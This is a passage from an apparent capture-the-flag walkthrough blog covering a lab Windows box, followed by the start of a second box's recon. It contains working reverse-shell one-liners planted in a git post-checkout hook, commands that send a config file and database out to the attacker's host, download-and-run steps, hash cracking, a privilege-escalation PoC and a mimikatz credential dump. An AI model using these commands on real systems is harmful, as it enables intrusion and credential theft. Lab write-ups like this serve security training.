cd ../www # go back to the http server directory msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.10 LPORT=4444 -f exe &gt; revshell.exe vim revshell1.ps1 # Paste in &#34;Powershell #1&#34; reverse shell Now I&rsquo;ll modify the post-checkout hook to delier some more:
#!/bin/bash # To know if the payloads were actually delivered: curl &#34;http://10.10.14.10:8000/?msg=spray-and-pray-start&#34; # nc variants nc.exe 10.10.14.10 4444 -e cmd ncat.exe 10.10.14.10 4444 -e cmd nc.exe -e cmd 10.10.14.10 4444 ncat.exe -e cmd 10.10.14.10 4444 curl &#34;http://10.10.14.10:8000/?msg=nc-variants-failed&#34; # MSFVenom exe curl -sLo C:\\Users\\Shared\\revshell.exe http://10.10.14.10:8000/revshell.exe C:\\Users\\Shared\\revshell.exe curl &#34;http://10.10.14.10:8000/?msg=exe-failed&#34; # Powershell #1 curl -sLo C:\\Windows\\Temp\\revshell1.ps1 http://10.10.14.10:8000/revshell1.ps1 powershell.exe -NoProfile -ExecutionPolicy Bypass -File &#39;C:\\Windows\\Temp\\revshell1.ps1&#39; curl &#34;http://10.10.14.10:8000/?msg=powershell-1-failed&#34; # Powershell #2 powershell -nop -c &#34;$client = New-Object System.Net.Sockets.TCPClient(&#39;10.10.14.10&#39;,4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2&gt;&amp;1 | Out-String );$sb2 = $sb + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()&#34; curl &#34;http://10.10.14.10:8000/?msg=powershell-2-failed&#34; # Powershell #3 powershell -nop -W hidden -noni -ep bypass -c &#34;$TCPClient = New-Object Net.Sockets.TCPClient(&#39;10.10.14.10&#39;, 4444);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + &#39;SHELL&gt; &#39;);$StreamWriter.Flush()}WriteToStream &#39;&#39;;while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2&gt;&amp;1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()&#34; curl &#34;http://10.10.14.10:8000/?msg=powershell-3-failed&#34; # Powershell #3 Base-64 encoded powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAwACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA== curl &#34;http://10.10.14.10:8000/?msg=powershell-3b64-failed&#34; curl &#34;http://10.10.14.10:8000/?msg=spray-and-pray-end&#34; I&rsquo;ve sprinkled in a few cURL commands to indicate progress through the reverse shell. That way, if one is successful, I&rsquo;ll know which worked &#x1f609;
&#x1f389; And we caught a shell!
Let&rsquo;s take a look at the HTTP server to see which of the reverse shells was successful:
The last message before it starts again was powershell-3-failed, so the successful reverse shell was Powershell #3 Base-64. Perfect, let&rsquo;s thin-down the post-checkout hook to just that one reverse shell (in case our connection breaks and we need to re-exploit):
#!/bin/bash powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAwACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA== USER FLAG Local enumeration - Richard The folder where our reverse shell is formed seems empty. There are two other cloned repos present. Traversing all the way to C:\\Users\\Richard we see that there is conspicuously a .ssh folder:
I checked the bash_history and .gitconfig as well, but there was nothing important.
Planting SSH key The .ssh directory has an authorirized_keys file, so let&rsquo;s generate a keypair and plant one:
The authorized_keys file is actually empty, so we could probably just overwrite it with the pubkey using a cURL request, but I want to try using the base64 way instead:
ssh-keygen -t rsa -b 4096 -f richard_id_rsa -N &#39;st4rling&#39; chmod 600 richard_id_rsa base64 -w 0 richard_id_rsa.pub # copy to clipboard Now, in the richard shell, plant the key:
$base64 = &#34;c3NoLXJzYSBBQU...9PSBrYWxpQGthbGkK&#34; # Paste from clipboard $bytes = [Convert]::FromBase64String($base64) $decoded = [System.Text.Encoding]::UTF8.GetString($bytes) Write-Output $decoded | Tee-Object C:\\Users\\Richard\\.ssh\\authorized_keys -Append Unfortunately, attempts to log in over SSH were unsuccessul (Unsurprising, as we never actually saw SSH listening):
Filesystem enumeration There doesn&rsquo;t seem to be a flag in C:\\Users\\Richard\\Desktop, where it would usually be. Let&rsquo;s see if it&rsquo;s anywhere we can access as Richard:
Get-ChildItem -Path C:\\ -Filter &#34;user.txt&#34; -Recurse -Force -ErrorAction SilentlyContinue Nope, nothing. Although there&rsquo;s no flag, we can see under their Documents folder the clone.sh script (clearly the script that gitbash is running to clone our repos):
#!/bin/bash # Define the file containing repository URLs repos_file=&#34;C:/Users/Richard/source/repos/repos.txt&#34; # Specify the path where you want to clone the repositories clone_path=&#34;C:/Users/Richard/source/cloned_repos&#34; # Check if the file exists if [ ! -f &#34;$repos_file&#34; ]; then echo &#34;Error: Repositories file $repos_file not found.&#34; exit 1 fi # Create the clone path if it doesn&#39;t exist mkdir -p &#34;$clone_path&#34; # Loop through each repository URL in the file and clone it while IFS= read -r repo_url; do if [[ ! -z &#34;\${repo_url}&#34; ]]; then repo_name=$(head /dev/urandom | tr -dc a-z0-9 | head -c 5) echo &#34;Cloning repository: $repo_url&#34; git clone --recursive &#34;$repo_url&#34; &#34;$clone_path/$repo_name&#34; echo &#34;Repository cloned.&#34; fi done &lt; &#34;$repos_file&#34; echo -n &gt; &#34;$repos_file&#34; echo &#34;All repositories cloned successfully to $clone_path.&#34; # Cleanup Section # Define the folder path folderPath=&#34;C:/Users/Richard/source/cloned_repos&#34; # Check if the folder exists if [ -d &#34;$folderPath&#34; ]; then echo &#34;Deleting contents of $folderPath...&#34; # Delete all files in the folder find &#34;$folderPath&#34; -mindepth 1 -type f -delete # Delete all directories and subdirectories in the folder find &#34;$folderPath&#34; -mindepth 1 -type d -exec rm -rf {} + echo &#34;Contents of $folderPath have been deleted.&#34; else echo &#34;Folder $folderPath not found.&#34; fi This script has nothing about compiling code in it. Unless another script is reading through the C:/Users/Richard/source/cloned_repos folder and compiling, I&rsquo;m not confident that \`\`\`http://compiled.htb:5000\` actually does what it claims to do &#x1f440;
systeminfo | findstr /B /C:&#34;OS Name&#34; /C:&#34;OS Version&#34; The target is running Windows 10 Pro 10.0.19045 N/A Build 19045
We can see from net users that Administrator, Richard, and Emily are the main users on the target. It looks like Emily is the user with remote access (WinRM):
We can see from netstat -ano that there are a bunch of listening ports that we didn&rsquo;t detect during the initial scan (I wonder why?):
tasklist shows that ssh-agent is running at PID 2664, but it&rsquo;s not one of the listening ports. We also see the two web services running:
python.exe 3844 0 5,680 K gitea.exe 6804 0 158,644 K Wow, gitea uses a lot more memory than I thought it would!
Website configuration The C:\\app folder holds the http://compiled.htb:5000 web app running on port 5000. As we observed earlier, the code is very slightly different from what&rsquo;s shown in the gitea repo (the URL filter clause):
from flask import Flask, request, render_template, redirect, url_for import os app = Flask(__name__) # Configuration REPO_FILE_PATH = r&#39;C:\\Users\\Richard\\source\\repos\\repos.txt&#39; @app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;]) def index(): error = None success = None if request.method == &#39;POST&#39;: repo_url = request.form[&#39;repo_url&#39;] if repo_url.startswith(&#39;http://&#39;) and repo_url.endswith(&#39;.git&#39;): with open(REPO_FILE_PATH, &#39;a&#39;) as f: f.write(repo_url + &#39;\\n&#39;) success = &#39;Your git repository is being cloned for compilation.&#39; else: error = &#39;Invalid Git repository URL. It must start with &#34;http://&#34; and end with &#34;.git&#34;.&#39; return render_template(&#39;index.html&#39;, error=error, success=success) if __name__ == &#39;__main__&#39;: app.run(host=&#39;0.0.0.0&#39;, port=5000) Other than that, there are some static files and templates. Nothing important
Gitea configuration We saw earlier from tasklist that gitea is running as an exe (as opposed to running as a docker instance). That means it&rsquo;s probably registered as a service.
A quick look through the Gitea installation documentation gives us a list of things to check out:
Configuration file at [installation_dir]\\custom\\conf\\app.ini Possibly a database, which would be in [installation_dir]\\data\\gitea.db if it&rsquo;s present I found the gitea installation directory at C:\\Program Files\\gitea. As we had hoped, there is a configuration file in the expected location, C:\\Program Files\\gitea\\custom\\conf\\app.ini:
&#x1f447; I&rsquo;ve omitted a few sections that didn&rsquo;t seem important:
RUN_USER = COMPILED\\Richard APP_NAME = Git RUN_MODE = prod WORK_PATH = C:\\Program Files\\gitea # ... [database] DB_TYPE = sqlite3 HOST = 127.0.0.1:3306 NAME = gitea USER = gitea PASSWD = SCHEMA = SSL_MODE = disable PATH = C:\\Program Files\\gitea\\data\\gitea.db LOG_SQL = false # ... [server] SSH_DOMAIN = gitea.compiled.htb DOMAIN = gitea.compiled.htb HTTP_PORT = 3000 ROOT_URL = http://gitea.compiled.htb:3000/ APP_DATA_PATH = C:\\Program Files\\gitea/data DISABLE_SSH = false SSH_PORT = 22 LFS_START_SERVER = true LFS_JWT_SECRET = ten8FWelzw36S77bYSUGlVCmrZn4jncN1ekaH1NoXO4 OFFLINE_MODE = false # ... [log] MODE = console LEVEL = info ROOT_PATH = C:/Program Files/gitea/log # ... [security] INSTALL_LOCK = true INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MTY0MDEzMDR9.oQ3gsIgAi1_JTKKbw0lCKjwfcB3v7HvH6Wzb6M7dkE0 PASSWORD_HASH_ALGO = pbkdf2 [oauth2] JWT_SECRET = XCXy54fFBqA-KAHA0Cjn5wp1gO4l-LY2-qgCS58VJO0 I also attempted to exfil this file, but was having issues with a regular curl upload:
curl -F &#34;file=@.\\app.ini&#34; http://10.10.14.10:8000 To work around this I&rsquo;ll just send the data as base64:
$b64 = [System.convert]::ToBase64String((Get-Content -Path app.ini -Encoding byte)) Invoke-WebRequest -Uri http://10.10.14.10:8000/?b64=$b64 &#x261d;&#xfe0f; My simple-http-server will automatically decode anything handed to it with the b64 parameter. Normally it also handles file uploads just fine, but something seems to not be working for that.
This file provides us with the database credentials and filepath, and the password hashing algorithm (pbkdf2). Let&rsquo;s also exfiltrate the database. The database is roughly 2MB, so probably too large for a GET parameter. Let&rsquo;s send it as a POST body instead:
simple-server 8000 -v | tee -a log.txt cd ..\\..\\data $b64 = [System.convert]::ToBase64String((Get-Content -Path gitea.db -Encoding byte)) Invoke-WebRequest -Uri http://10.10.14.10:8000/database -Method POST -Body $b64 Now there&rsquo;s a bit of junk in the log.txt file. Only the final line is the base64 data. Also, there are two tab characters preceding the actual data - let&rsquo;s fix all that:
tail -n 1 log.txt | sed &#39;s/^..//&#39; | base64 -d &gt; gitea.db Alright, it looks like a valid database now. Let&rsquo;s take a look inside:
sqlite3 gitea.db # Make output formatting nicer sqlite&gt; .headers on sqlite&gt; .mode table # Enumerate tables sqlite&gt; .tables # There is a &#34;user&#34; table! sqlite&gt; .schema user Wow that&rsquo;s a big table. Let&rsquo;s just take the important data:
SELECT id,name,is_admin,passwd,salt,passwd_hash_algo FROM user; Great - let&rsquo;s adjust that to make the data more conducive for copy-pasting:
.mode csv .separator : SELECT name,passwd,salt FROM user; # copy to clipboard .quit Now I&rsquo;ll paste that into gitea.hash and see if I can crack it. The passwd_hash_algo field indicates that this is using 50,000 rounds of SHA256 and outputing a key of length 50 - very computationally intensive! &#x1f631;
&#x1f914; Unfortunately, I wasn&rsquo;t able to get either john or hashcat to recognize the hashing format. Perhaps I need to transform the hash a bit - there were a few example-hashes in hashcat that were pretty close but not quite the same format..?
After a long time of messing around with different formats, I still couldn&rsquo;t get either john or hashcat to recognize the format! To get around this, I wrote my own cracking program. Please go ahead and download that repo to try it out.
The whole rockyou.txt wordlist was a bit much for it (50,000 rounds!), so I thinned down the wordlist before running my program:
cd exploit git clone https://github.com/4wayhandshake/Crack-PBKDF2-HMAC-SHA265.git cd Crack-PBKDF2-HMAC-SHA265 PASSWDS=/usr/share/wordlists/rockyou.txt head -n 10000 $PASSWDS &gt; test_wordlist.txt python3 crack_pbkdf2_hashes.py test_wordlist.txt ../../loot/gitea.hash Thank goodness that HTB almost always uses passwords from rockyou. Otherwise, I wouldn&rsquo;t even have a chance to crack this password&hellip;
After a few seconds, we have a result!
We found a gitea credential - emily : 12345678. What a terrible password &#x1f602;
We saw earlier that Emily is a member of Remote Management Users; with a little luck, emily will have re-used this password for WinRM:
evil-winrm -i $RADDR -u &#39;emily&#39; -p &#39;12345678&#39; &#x1f601; Alright! We now have a way to log in without re-exploiting the target. Plus, we already suspect that Emily has the user flag:
There it is. Read it for some points, and we&rsquo;ll move on to privesc:
type C:\\Users\\Emily\\Desktop\\user.txt ROOT FLAG Local enumeration - Emily Manual Enum Let&rsquo;s check the privileges that Emily has:
whoami /priv I like to perform a little bit of manual enumeration before I jump into an automatic tool, so I&rsquo;ll run through my usual list:
net users net user emily networking stuff (are we in a Docker container?) ipconfig /all route print arp -A netstat -ano (Any listeners only exposed locally?) tasklist schtasks /query /fo LIST /v (Check for scheduled processes. Usually just read the top 10) findstr /si &quot;password&quot; C:\\Users\\Emily\\*.txt C:\\Users\\Emily\\*.ini C:\\Users\\Emily\\*.config (basically grep -iR password C:\\Users\\Emily) We see something a little interesting in the schtasks /query call:
# Cleanup script: C:\\Windows\\System32\\cmd.exe /c C:\\Users\\Richard\\Documents\\cleanup.bat # Clone.sh (checked it out earlier): C:\\Program Files\\Git\\git-bash.exe&#34; &#34;C:\\Users\\Richard\\Documents\\clone.sh # Flask server on port 5000 &#34;C:\\Program Files\\Python312\\python.exe&#34; \\app\\app.py # Visual Studio ..? C:\\Program Files (x86)\\Microsoft Visual Studio\\Installer\\resources\\app\\ServiceHub\\Services\\Microsoft.VisualStudio.Setup.Service\\BackgroundDownload.exe It shouldn&rsquo;t be a huge surprise that the box is running Visual Studio, but it&rsquo;s definitely odd. Let&rsquo;s take a mental note of this and move on.
&#x1f4a1; Often, performing manual enumeration is all about finding the &ldquo;odd&rdquo; things. These are the things that set the box apart from a typical baseline installation, and might be misconfigured!
Keeping this mindset will help you generate a short to-do list for the rest of your privesc investigation
Next I&rsquo;ll check for interesting files. We can see Emily has a folder for Visual Studio in her Documents:
Automatic Enum The target host seems perfectly accepting of downloading exe files, so I&rsquo;ll grab a few handy tools:
(New-Object Net.WebClient).DownloadFile(&#39;http://10.10.14.10:8000/winPEASany.exe&#39;,&#39;C:\\Users\\Emily\\Downloads\\winPEAS.exe&#39;) (New-Object Net.WebClient).DownloadFile(&#39;http://10.10.14.10:8000/Ghostpack-CompiledBinaries/SharpUp.exe&#39;, &#39;C:\\Users\\Emily\\Downloads\\SharpUp.exe&#39;) WinPEAS points out that Emily has accessed some interesting things recently, including powershell, the task scheduler, and services.msc:
Let&rsquo;s check out services.msc to see the running services, and see what Emily has been up to:
services.msc OK, we just found a service related to Visual Studio. Again, it&rsquo;s not entirely unexpected, it&rsquo;s just a little weird. Let&rsquo;s do a quick Google search to see if anything comes up.
A search for &ldquo;Visual Studio VSStandardCollectorService150 privilege escalation exploit CVE&rdquo; leads us straight to an article talking about how to privesc based on that program &#x1f62e;
CVE-2024-20656 Research Apparently, there&rsquo;s a flaw in Visual Studio that affects how directories are linked to each other, or something..? It&rsquo;s not super clear. I don&rsquo;t have a very deep background in this stuff. Thankfully though, the author left a PoC on Github.
&#x1f62c; The downside is that the PoC must be an actual Visual Studio project: there&rsquo;s not going to be any way around using Windows to get this working.
Modify and Compile I don&rsquo;t have any Windows system available, unfortunately. It sure is frustrating when there&rsquo;s no way to work around using Windows!
Thankfully, I found some kind and generous person (@malvik) who took the above PoC and compiled it for me. He had to change the version to Visual Studio 2019, and the payload was modified as indicated below &#x1f447;
The payload itself is hardcoded within the cb1() function. In the PoC, this copies cmd.exe to overwrite MofCompiler.exe (then runs it), but we have changed the payload to run a reverse shell instead.
void cb1() { printf(&#34;[*] Oplock!\\n&#34;); while (!Move(hFile2)) {} printf(&#34;[+] File moved!\\n&#34;); CopyFile(L&#34;c:\\\\programdata\\\\revshell.exe&#34;, L&#34;C:\\\\ProgramData\\\\Microsoft\\\\VisualStudio\\\\SetupWMI\\\\MofCompiler.exe&#34;, FALSE); finished = TRUE; } For this to do anything, we must create a program to open a reverse shell, serve the reverse shell to the target, then open the reverse shell listener:
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=4444 -f exe -o revshell.exe sudo ufw allow from $RADDR to any port 4444 bash rlwrap nc -lvnp 4444 Let&rsquo;s toss the exploit Expl.exe and revshell.exe into C:\\ProgramData and try running it:
upload Expl.exe upload revshell.exe .\\Expl.exe We see [+] Persmissions successfully reseted!, but we don&rsquo;t actually see the payload in cb1() firing&hellip;
Maybe it&rsquo;s a permissions thing? Sometimes, we can&rsquo;t run everything directly out of WinRM - we need to explicitly run it as the user:
upload RunasCs.exe .\\RunasCs.exe emily 12345678 &#34;.\\Expl.exe&#34; Bingo! That did the trick. The print statements inside cb1() are now visible - that&rsquo;s a really good sign:
&#x1f601; ​Checking our reverse shell listener, we see that the exploit had the desired effect:
The flag is in the usual spot. Just type it out to finish off the box:
type C:\\Users\\Administrator\\Desktop\\root.txt &#x1f389; Awesome! So glad to be done this one.
CLEANUP Target I&rsquo;ll get rid of all the tools I transferred to the box
del &#34;C:\\Users\\Emily\\Downloads\\*.*&#34; del &#34;C:\\ProgramData\\Expl.exe&#34; del &#34;C:\\ProgramData\\revshell.exe&#34; Attacker There&rsquo;s also a little cleanup to do on my local / attacker machine. It&rsquo;s a good idea to get rid of any &ldquo;loot&rdquo; and source code I collected that didn&rsquo;t end up being useful, just to save disk space:
rm loot/gitea.db loot/gitea.hash It&rsquo;s also good policy to get rid of any extraneous firewall rules I may have defined. This one-liner just deletes all the ufw rules:
NUM_RULES=$(($(sudo ufw status numbered | wc -l)-5)); for (( i=0; i&lt;$NUM_RULES; i++ )); do sudo ufw --force delete 1; done; sudo ufw status numbered; EXTRA CREDIT: FULL PWN Mimikatz (lsadump::sam) Transferred mimikatz.exe to the target box using my Emily WinRM connection, via my HTTP server.
Note that this is the copy of mimikatz from kali: /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe
(New-Object Net.WebClient).DownloadFile(&#39;http://10.10.14.14:8000/mimikatz.exe&#39;, &#39;C:\\ProgramData\\mimikatz.exe&#39;) Then, using the administrator reverse shell, we run mimikatz.exe:
.\\mimikatz.exe &#34;privilege::debug&#34; &#34;lsadump::sam&#34; &#34;exit&#34; Since we&rsquo;re administrator, we get a dump of ALL of the hashes (including, of course, administrator itself) &#x1f911;
&#x1f4b0; We can now use the NTLM hash in lieu of a password, and ditch our reverse shell for a fancy WinRM connection:
evil-winrm -i compiled.htb -u administrator -H f75c95bc[...................]938061e LESSONS LEARNED Attacker &#x1f921; Keep RunasCs.exe handy. If you get permission errors, try using RunasCs. Heck, if something just doesn&rsquo;t run like you think it should, try using RunasCs. &#x1f4c2; Use evil-winrm for file transfer. I don&rsquo;t use meterpreter very often, so personally I forget that people don&rsquo;t transfer files over SMB and HTTP all the time. It&rsquo;s quick and really easy - just do it! &#x1f4da; Spend a minute or two researching every &ldquo;odd&rdquo; thing. Even if it seems inconsequential, like the presence of Visual Studio, just do one quick google search on the version number, service name, etc&hellip; There&rsquo;s a good chance that you&rsquo;re following in the footsteps of a skilled security researcher! Defender &#x1f4aa; Strong hashing is worthless if you&rsquo;re still using weak passwords. On this box, we recovered hashes for three unknown passwords from the gitea database. The hashing algorithm that they used definitely follow best-practices, but Emily&rsquo;s password was terrible. As a result, we were able to crack the password within a matter of seconds despite the very strong hashing.
&#x1f550; Keep your dev software updated. I know it sounds like a cheap-shot to say &ldquo;keep all your things updated all the time&rdquo;, but on this box we encountered git that was several minor versions behind, and a copy of Visual Studio that was at least four years out of date! No excuses for that level of sluggishness &#x261d;&#xfe0f;
`,url:"https://4wayhandshake.github.io/walkthrough/compiled/"},"https://4wayhandshake.github.io/walkthrough/bigbang/":{title:"BigBang",tags:["Wordpress","PHP Filter Chains","Buddyforms","Wrapwrap","Heap overflow","Password Cracking","Tunneling","Grafana","API abuse","APK Reversing","JADX","OS Command Injection","Filter Bypass"],categories:["Walkthrough","HTB","Linux","Hard"],content:`INTRODUCTION BigBang was released as the third box of Season 7 Vice. It&rsquo;s rated as Hard, but I think it&rsquo;s more correctly classified as Insane. It took me roughly 35h to complete, research and all.
Recon was pretty simple, at surface level. The target is just a standard Wordpress site. Do a bit of Wordpress-specific recon to find some interesting things about the site. Try finding the interactive elements on the page, and you will quickly see a way to upload files. If you can turn this into an arbitrary upload, you&rsquo;re well on the way to foothold.
Vulnerability research is absolutely essential for foothold. The exploit you&rsquo;ll need to craft really has two major parts. The first part is not too big of a stretch, an experienced person can figure it out without too much difficulty. The second part, however, is ludicrous, and it&rsquo;s absolutely baffling how anyone ever figured it out - one of those Pwn exploits that require crazy memory management tricks. Thankfully, there is a PoC somewhere that will aid in crafting an exploit for this target.
If you somehow manage to gain a foothold, things get a lot more straightforward, but there will be three more pivots still. Crack some hashes, test some credential reuse, repeat.
At the final user, you will discover an APK to analyze. Try to learn how the app works, and how it might interact with the rest of the system infront of you. Ultimately, the APK is only a way to gain an understanding of the surrounding environment; it&rsquo;s not the actual target. The final exploit is deceptively simple, but requires a bypass that you might not try right away.
This box was&hellip; a major challenge. Despair. &#x1f614;
RECON nmap scans Port scan I&rsquo;ll set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scan it with a port scan covering all ports:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 d4:15:77:1e:82:2b:2f:f1:cc:96:c6:28:c1:86:6b:3f (ECDSA) |_ 256 6c:42:60:7b:ba:ba:67:24:0f:0c:ac:5d:be:92:0c:66 (ED25519) 80/tcp open http Apache httpd 2.4.62 |_http-server-header: Apache/2.4.62 (Debian) |_http-title: Did not follow redirect to http://blog.bigbang.htb/ Note the redirect to http://blog.bigbang.htb
Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR No results
UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR &#x261d;&#xfe0f; UDP scans take quite a bit longer, so I limit it to only common ports
PORT STATE SERVICE VERSION 7/udp open|filtered echo 53/udp open|filtered domain 68/udp open|filtered tcpwrapped 80/udp open|filtered http 136/udp open|filtered tcpwrapped 162/udp open|filtered tcpwrapped 177/udp open|filtered xdmcp 1023/udp open|filtered tcpwrapped 1433/udp open|filtered tcpwrapped 1701/udp open|filtered L2TP 1900/udp open|filtered upnp 2049/udp open|filtered nfs 10000/udp open|filtered ndmp 20031/udp open|filtered tcpwrapped 49154/udp open|filtered unknown 49156/udp open|filtered unknown 49181/udp open|filtered unknown 49190/udp open|filtered unknown Note that any open|filtered ports are either open or (much more likely) filtered.
Webserver Strategy Noting the redirect from the nmap scan, I added bigbang.htb and the subdomain blog.bigbang.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=bigbang.htb echo &#34;$RADDR blog.$DOMAIN $DOMAIN&#34; | sudo tee -a /etc/hosts whatweb --aggression 3 http://$DOMAIN &amp;&amp; whatweb --aggression 3 http://blog.$DOMAIN &amp;&amp; curl -IL http://$RADDR Now we know:
The operating system is Debian They&rsquo;re running a current version of Apache The target is Wordpress (I should go do some research on attacking wordpress &#x1f6a9;) Some weird headers are in the request Subdomain enum Next I&rsquo;ll perform vhost and subdomain enumeration. First, I&rsquo;ll check for alternate domains:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v No results.
Next I&rsquo;ll check for subdomains of bigbang.htb:
